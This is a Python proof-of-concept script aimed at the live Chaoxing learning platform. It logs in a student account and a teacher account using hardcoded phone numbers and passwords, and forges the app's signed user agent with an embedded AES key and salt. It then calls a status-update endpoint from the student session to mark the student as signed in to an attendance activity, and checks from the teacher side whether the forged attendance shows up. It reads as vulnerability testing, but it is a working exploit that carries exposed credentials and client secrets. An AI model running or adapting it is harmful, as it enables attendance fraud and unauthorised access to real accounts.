import base64, hashlib, json, uuid, requests, urllib3, time, re
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

s_s, puid_s = login("18436633997", "3.1415926Cpy")
s_t, puid_t = login("19712720708", "3.1415926Cpy")
base = "https://mobilelearn.chaoxing.com"

print("=" * 80)
print("关键验证：学生修改后，教师端管理页面是否能看到变化？")
print("=" * 80)

# 找一个手势签到活动（之前测试中aid=5000139410338是未签到的）
# 先列出所有活动
r = s_s.get(f"{base}/ppt/activeAPI/taskactivelist",
            params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
d = safe_json(r)
active_list = d.get("activeList", [])

# 找手势签到活动5000139410338
target_aid = "5000139410338"
print(f"\n目标活动: {target_aid}")

# 1. 修改前：教师端管理页面查看
print(f"\n--- 修改前：教师端管理页面 ---")
r = s_t.get(f"{base}/pptSign/signedResult",
            params={"activeId": target_aid, "classId": CLASS_ID, "courseId": COURSE_ID},
            timeout=20, allow_redirects=True)
print(f"  signedResult: HTTP {r.status_code}, len={len(r.text)}")
if r.status_code == 200 and len(r.text) > 100:
    # 查找学生431407443的记录
    has_student = "431407443" in r.text or "3141cpy" in r.text.lower()
    print(f"  页面中是否有学生记录: {has_student}")

# 2. 学生修改
print(f"\n--- 学生调用 /newsign/updateSignStatus status=1 ---")
r = s_s.post(f"{base}/newsign/updateSignStatus",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": target_aid},
             data={"uids": puid_s, "status": "1", "remark": "",
                   "activeId": target_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
             headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                      "Content-Type": "application/x-www-form-urlencoded"},
             timeout=20)
print(f"  API返回: {r.text}")

time.sleep(3)

# 3. 修改后：教师端管理页面查看（不调用教师V2 API）
print(f"\n--- 修改后：教师端管理页面（不调用教师V2修改API）---")
r = s_t.get(f"{base}/pptSign/signedResult",
            params={"activeId": target_aid, "classId": CLASS_ID, "courseId": COURSE_ID},
            timeout=20, allow_redirects=True)
print(f"  signedResult: HTTP {r.status_code}, len={len(r.text)}")
if r.status_code == 200 and len(r.text) > 100:
    has_student = "431407443" in r.text or "3141cpy" in r.text.lower()
    print(f"  页面中是否有学生记录: {has_student}")
    if has_student:
        print(f"  🔴🔴🔴 教师端管理页面可以看到学生签到记录！漏洞真实有效！")

# 4. 学生端查询
print(f"\n--- 学生端V2 signIn查询 ---")
r = s_s.get(f"{base}/v2/apis/sign/signIn", params={"activeId": target_aid, "uid": puid_s}, timeout=20)
d = safe_json(r)
status = d.get("data", {}).get("status") if isinstance(d.get("data"), dict) else None
print(f"  status={status}, {json.dumps(d, ensure_ascii=False)[:300]}")

# 5. 教师端V2 signIn查询
print(f"\n--- 教师端V2 signIn查询 ---")
r = s_t.get(f"{base}/v2/apis/sign/signIn", params={"activeId": target_aid, "uid": puid_s}, timeout=20)
d = safe_json(r)
status = d.get("data", {}).get("status") if isinstance(d.get("data"), dict) else None
print(f"  status={status}, {json.dumps(d, ensure_ascii=False)[:300]}")

# 6. 教师端签到统计API
print(f"\n--- 教师端签到统计 ---")
r = s_t.get(f"{base}/pptSign/signStatis",
            params={"activeId": target_aid, "classId": CLASS_ID, "courseId": COURSE_ID},
            timeout=20)
print(f"  signStatis: HTTP {r.status_code}, len={len(r.text)}")
if r.status_code == 200:
    print(f"  内容: {r.text[:300]}")

# 7. 教师端学生列表API
print(f"\n--- 教师端学生签到列表 ---")
r = s_t.get(f"{base}/pptSign/getSignStudentList",
            params={"activeId": target_aid, "classId": CLASS_ID, "courseId": COURSE_ID},
            timeout=20)
d = safe_json(r)
print(f"  getSignStudentList: HTTP {r.status_code}, {json.dumps(d, ensure_ascii=False)[:300]}")

# 也尝试其他查询端点
for endpoint in ["/pptSign/signDetail", "/pptSign/getSignList"]:
    r = s_t.get(f"{base}{endpoint}",
                params={"activeId": target_aid, "classId": CLASS_ID, "courseId": COURSE_ID},
                timeout=20)
    print(f"  {endpoint}: HTTP {r.status_code}, {r.text[:100]}")

print(f"\n{'=' * 80}")
print(f"关键问题：/newsign/updateSignStatus 是否只是返回假success？")
print(f"{'=' * 80}")

# 测试一个不存在activeId
print(f"\n--- 测试不存在的activeId ---")
r = s_s.post(f"{base}/newsign/updateSignStatus",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": "9999999999999"},
             data={"uids": puid_s, "status": "1", "remark": "",
                   "activeId": "9999999999999", "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
             headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                      "Content-Type": "application/x-www-form-urlencoded"},
             timeout=20)
print(f"  不存在activeId: {r.text}")

# 对比：/pptSign/updateSignStatusByUidsV2对不存在activeId
r = s_t.post(f"{base}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": "9999999999999"},
             data={"uids": puid_s, "status": "1", "remark": ""},
             headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                      "Content-Type": "application/x-www-form-urlencoded"},
             timeout=20)
print(f"  V2不存在activeId: {r.text[:200]}")
